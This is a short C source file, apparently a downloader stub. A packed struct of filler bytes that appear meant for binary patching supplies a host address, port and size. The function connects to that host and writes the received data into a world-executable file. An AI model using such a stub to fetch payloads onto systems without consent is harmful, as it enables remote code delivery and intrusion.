#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <fcntl.h>

struct
{
    uint32_t addr;
    uint16_t port;
    uint64_t pkg_size;
} __attribute__((packed)) volatile payload = {0xb3b3b3b3, 0xb3b3, 0xb3b3b3b3b3b3b3b3};

int do_download_pkg(const char* path)
{
    struct sockaddr_in tgt = {
        .sin_family = AF_INET,
        .sin_addr = {.s_addr = payload.addr},
        .sin_port = payload.port,
    };
    int out_fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if(out_fd < 0)
        return -1;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0)
    {
        close(out_fd);
        return -1;
    }
    ssize_t sz = -1;
    if(connect(sock, (struct sockaddr*)&tgt, sizeof(tgt)) < 0)
        goto out;
    ssize_t total = payload.pkg_size;
    char buf[4096];
    char ack = 0;
    while((sz = read(sock, buf, sizeof(buf))) > 0)
    {
        total -= sz;
        char* p = buf;
        while(sz > 0)
        {
            ssize_t chk = write(out_fd, p, sz);
            if(chk <= 0)
                goto out;
            sz -= chk;
            p += chk;
        }
        write(sock, &ack, 1);
    }
out:
    close(sock);
    close(out_fd);
    return (sz || total) ? -1 : 0;
}
